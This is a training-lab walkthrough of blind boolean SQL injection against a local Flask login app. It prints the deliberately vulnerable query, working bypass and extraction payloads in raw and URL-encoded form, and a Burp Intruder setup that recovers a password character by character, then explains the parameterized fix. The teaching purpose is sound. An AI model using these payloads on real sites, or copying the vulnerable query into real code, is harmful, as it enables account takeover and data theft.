# Walkthrough — sqli-blind-boolean

## 1. Context

The app exposes a single-page login. You type a username and password on `/`, the form submits a `POST /login` request, and the server queries a `users` table in SQLite for a row matching both fields. The response is one of two pages, both returned with HTTP 200:

- `Welcome, <username>!` when a row matches.
- `Invalid credentials.` when no row matches.

There's no session, no cookie, no flash message — just one of two body texts. Three users are seeded (`alice`, `bob`, `carol`); alice's password is `wonderland`. Alongside `users` the same database file holds a `secrets` table mirroring atom-01's schema, kept here for recognition but not the target of this atom's exploit.

The bug, the oracle, and the blind extraction all live in that small surface.

## 2. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). The `/login` view builds its SQL like this:

```python
username = request.form.get("username", "")
password = request.form.get("password", "")
# VULNERABLE: user input concatenated into SQL string
query = (
    f"SELECT username FROM users "
    f"WHERE username = '{username}' AND password = '{password}'"
)
row = conn.execute(query).fetchone()
```

It's the same class of bug as [`sqli-union-basic`](../sqli-union-basic/) — two user-controlled values pasted into a SQL string with f-strings, no escaping, no parameter binding. What changes is what reaches the client. In `sqli-union-basic` the `/profile` view rendered every returned row as an HTML table, so a `UNION SELECT` was enough to exfiltrate data straight through the response. Here the view ignores all columns except whether `fetchone()` returned a row or not — and the template renders one of two strings depending on that one bit. **Unlike the previous atom, there is no "executed query" debug block. Blind has to stay blind** — leaking the query to the page would defeat the point of the exercise.

So the attacker has the same injection capability but a much narrower exfil channel: a single bit per request. The rest of this walkthrough is about how that one bit, used carefully, still extracts the password.

## 3. Exploitation via Burp Suite

This atom is worked entirely in Burp Suite (Proxy → Repeater → Intruder). The web interface exists only as a legitimate destination for the requests — every step below happens in Burp.

The login form on `/` issues a `POST /login` whose body is form-encoded as `username=<...>&password=<...>`. Build that request in a new Repeater tab targeting `127.0.0.1:8006` and send it once with the seeded credentials (`username=alice&password=wonderland`): the response body comes back with `<h1>Welcome, alice!</h1>`, your baseline for the success state. Every step below edits the body and re-sends.

> **Notation convention.** A lone uppercase letter in a payload (`N`, `P`, `C`) is a *reading placeholder* — substitute a concrete value before sending the request. Left literal, it fails one of two ways:
>
> - `N`, `P` (unquoted) → SQLite tries to resolve it as a column name → HTTP 500.
> - `'C'` (quoted) → a valid comparison against the string literal `'C'`, always false: no error, but no hits either.

### A note on encoding the body

The previous atoms taught one rule about URL encoding — that the request line `METHOD SP URI SP VERSION` can't contain literal spaces, so anything in the query string needs `%20`. Here the payload doesn't ride in the URI; it rides in the request body as `application/x-www-form-urlencoded`. Different parser, same idea:

- The body is a series of `name=value` pairs joined by `&`.
- Three characters carry structural meaning at that layer and **must** be percent-encoded inside a value: `=` (field separator), `&` (pair separator), and `%` (the encoding escape itself).
- Spaces in form-encoded bodies are conventionally encoded too — either as `%20` or as `+`. Both decode back to a space.
- Quotes, hyphens, parentheses, commas, and SQL operators (`<`, `>`) are all legal inside a value and travel fine as-is.

In Burp Repeater you have the same two choices as before: type each space as `%20` and leave the rest literal, or paste the decoded payload, select it, and press **Ctrl+U** for aggressive percent-encoding. Both forms arrive at the Flask app as the exact same string after the body is parsed.

Each step below shows two blocks: a **Body (decoded)** for reading and a **Body (Burp-ready)** with `%20` substituted for spaces, ready to paste straight into Repeater.

### Step 1 — Confirm the injection point (login bypass)

Body (decoded):

```
username=alice' --&password=anything
```

Body (Burp-ready):

```
username=alice%27%20--&password=anything
```

Send. Response body contains `<h1>Welcome, alice!</h1>`.

Walk through what happened to the SQL. After the body parser hands the values to Flask, the f-string becomes:

```sql
SELECT username FROM users WHERE username = 'alice' --' AND password = 'anything'
```

The `'` you sent closed the username string literal. The `--` then commented out the rest of the line, including the `AND password = '...'` check the application meant to enforce. The statement reduces to `SELECT username FROM users WHERE username = 'alice'`, which returns alice's row, which means `fetchone()` returns truthy, which means the template renders the welcome page. You signed in as alice without knowing alice's password.

This is the same technique you used in `sqli-union-basic` — close a literal, comment the rest — and it serves the same role here as an *anchor*: before stepping into anything blind, prove that the input is in fact reaching the SQL engine as code.

### Step 2 — Establish the boolean oracle (TRUE branch)

The next question is whether you can drive the response toward `Welcome` using only a logical condition, not a concrete username. Try the textbook payload first:

Body (decoded):

```
username=nobody' OR '1'='1&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20%271%27%3D%271&password=x
```

Send. Response: `Invalid credentials.`.

That probably surprised you. Let's read what actually executed:

```sql
SELECT username FROM users WHERE username = 'nobody' OR '1'='1' AND password = 'x'
```

The trap is SQL operator precedence: `AND` binds tighter than `OR`. The engine groups the predicate as `username='nobody' OR ('1'='1' AND password='x')`. The first side is false (no user is literally `nobody`), and the second side requires `password='x'`, which no row satisfies. False OR false → false → `fetchone()` returns nothing → `Invalid credentials.`. The `'1'='1'` you injected is true but it never reaches the OR because the AND consumes it first.

Now the fix — keep everything else, just add `--` at the end of the username:

Body (decoded):

```
username=nobody' OR '1'='1' --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20%271%27%3D%271%27%20--&password=x
```

Send. Response: `<h1>Welcome, alice!</h1>`.

The only thing that changed between the broken and working payloads is the trailing `--`. The query is now:

```sql
SELECT username FROM users WHERE username = 'nobody' OR '1'='1' --' AND password = 'x'
```

Everything from `--` onward is a comment. What remains is `WHERE username = 'nobody' OR '1'='1'`, which is true for every row. `fetchone()` returns the first row in the table (alice, by rowid order). The response renders her as the signed-in user.

The lesson here is about `--`, not about the quotes: when you don't see the query, you have to reason about operator precedence as if you had access to the parser. The cheapest way to short-circuit it is to comment out everything after your injected condition so nothing else can re-bracket the expression. One variable changed between the two payloads, one lesson is taught.

### Step 3 — Establish the FALSE branch

Now confirm the other half of the oracle. Same shape, but with a condition that's false for every row:

Body (decoded):

```
username=nobody' OR 1=2 --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%201%3D2%20--&password=x
```

Send. Response: `Invalid credentials.`.

Two pages, two observable response bodies, perfectly distinguishable in the Burp Response panel:

- Condition true → `Welcome, alice!`
- Condition false → `Invalid credentials.`

Any boolean condition you can express in SQL can now be answered by sending one request and reading one byte sequence in the response. This is the moment the word *blind* clicks: you can't see the data, but you can ask the database yes-or-no questions and read the answers off the page. The rest of the attack is just figuring out what to ask.

### Step 4 — Extract password length

Switch from demonstrating the oracle to *using* it. Embed a subquery that asks something concrete about real data — here, whether alice's password length equals some number N. Start with one concrete request that tests whether the length is 5:

Body (decoded):

```
username=nobody' OR (SELECT LENGTH(password) FROM users WHERE username='alice') = 5 --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20(SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%205%20--&password=x
```

Send. Response: `Invalid credentials.` — the length is not 5.

Now iterate the number in place (in Repeater, edit just the `5`):

- `... = 10 ...` → `Welcome, alice!`
- `... = 15 ...` → `Invalid credentials.`

Conclusion: alice's password is 10 characters long. You learned a fact about data you cannot read directly, by reading one bit per request.

A real attacker would automate this with Intruder (one position, payload set `Numbers` 1–20), but doing two or three iterations by hand here is enough to feel the rhythm before the next step turns the dial up.

### Step 5 — Extract characters and automate with Burp Intruder

Same trick, a finer-grained question. Instead of asking "is the length N?", ask "is the character at position P equal to candidate C?". `SUBSTR(password, P, 1)` pulls one character out of the password, and the comparison turns it into the single bit the oracle reveals.

**A — Probe the first character in Repeater**

Before automating, validate the technique by hand. Concrete payload testing whether the first character is `a`:

Body (decoded):

```
username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'a' --&password=x
```

Body (Burp-ready):

```
username=nobody%27%20OR%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27a%27%20--&password=x
```

Send. Response: `Invalid credentials.` — the first character is not `a`.

Change `'a'` to `'w'`, same request, send again. Response: `<h1>Welcome, alice!</h1>` — the first character is `w`.

The two numeric arguments of `SUBSTR` play distinct roles, and the distinction matters for the next step. The first (`1`) is the *position* — which character to read, the one you vary to sweep the whole password. The second (`1`) is the *length* — how many characters to read, always 1, one char at a time.

**B — Automate with Burp Intruder**

Doing this by hand for all 10 positions × 26 letters would be 260 requests. That's what Intruder is for. (Menu names below are Burp Community Edition; Pro is identical.)

1. **Send to Intruder.** Right-click the working Repeater request, choose **Send to Intruder**, and switch to the Intruder tab. The base request in the **Positions** editor, before you mark anything, is:

   ```
   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w' --&password=x
   ```

2. **Mark two payload positions** with `§...§`:
   - The **first `1`** — the position argument of `SUBSTR`, sitting between `'alice'),` and `,1)`. This one sweeps `1` → `10`.
   - The **`w`** between the single quotes — the candidate character. This one sweeps `a` → `z`. Mark just the letter, not the quotes.

   The result in the editor:

   ```
   username=nobody' OR SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§' --&password=x
   ```

   **Do not mark the second `1`** — the length argument of `SUBSTR`, which stays fixed at 1. Both arguments are a literal `1` in the base payload, so it's easy to grab the wrong one. Mark the length instead of the position and the read stays pinned to position 1: the sweep then asks whether the *first N characters* equal a single candidate letter — only the `N = 1` case can be true, so you'd surface the first letter and never advance past it.

3. **Attack type:** `Cluster bomb` — it iterates the Cartesian product of the two payload sets, every position combined with every candidate.

4. **Payload set 1 (the position):**
   - Type: `Numbers`
   - From `1`, To `10`, Step `1`
   - Payload count: 10

5. **Payload set 2 (the candidate):**
   - Type: `Simple list`
   - Paste the 26 lowercase letters, one per line (`a`, `b`, `c`, ..., `z`)
   - Payload count: 26

   **Don't reach for `Brute forcer`** even though it looks like the obvious fit. Brute forcer with the charset `[a-z]` and a max length above 1 — the default in most Burp versions — generates 26⁴ = 456,976 payloads instead of 26. `Simple list` is deterministic: it generates exactly what's in the list.

   Confirm before running — **Request count: 260** (10 × 26).

6. **Grep — Match.** Under the Intruder tab's **Settings** (or **Options** on older Burp versions), find **Grep — Match** and add the literal string `Welcome, alice!`. Once the attack runs, Intruder shows a checkbox column per request — the binary oracle, surfaced as a sortable column.

7. **Start attack.** Sort the results table by the `Welcome, alice!` column, descending. The 10 hits reveal, in position order, the letters `w`, `o`, `n`, `d`, `e`, `r`, `l`, `a`, `n`, `d` → `wonderland`.

That's alice's stored password, recovered without it ever appearing in a single response body.

### Why this is "blind" — explicit contrast with sqli-union-basic

The cause of the bug is identical in both atoms: user input concatenated into a SQL string with no parameter binding. What differs is what the attacker can see and therefore the *shape* of the exploit.

In `sqli-union-basic` the exfil channel is the response body itself: `UNION` appends extra rows, the template renders every returned column, the attacker reads data straight off the page. The work fits in three payloads because each one returns the actual data.

Here there is no data channel. The body has exactly two shapes: `Welcome` or `Invalid`. The attacker inverts the problem — instead of asking "give me the data", they ask the database "is the data *equal to* this candidate?", and use the two observable response states as a single bit. Two hundred sixty bits of carefully chosen questions later, the password is reconstructed. Same bug, narrower channel, more requests, same outcome.

A real-world note while we're here: real apps store passwords as hashes, not plaintext. The blind technique above works the same way against a hash column — you'd just be extracting `$2b$12$...` instead of `wonderland`, which takes many more requests (a wider charset and a longer string). The technique is what generalizes; the column you're reading is a detail of this particular lab.

## 4. Why the fix works

See [`DIFF.md`](./DIFF.md) for the change. In short: the fixed version calls `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. With placeholders, the SQLite driver parses the SQL statement first — without the parameter values — and only afterward binds each input as a literal data value into the pre-parsed statement. No character in either input can shift the parse: `'`, `--`, `OR`, `SELECT`, parentheses, newlines all stay inside their respective string-literal slots and are never reinterpreted as SQL syntax.

Run any payload from section 3 against <http://127.0.0.1:8106/login>. Every one returns `Invalid credentials.` — including the Step 1 login bypass, which against the vulnerable version was a free pass. The two response strings haven't changed; that asymmetry is legitimate login behavior, not the bug. What the attacker has lost is any ability to inject a condition that would steer the response toward `Welcome`. The oracle still exists; the attacker no longer controls it.
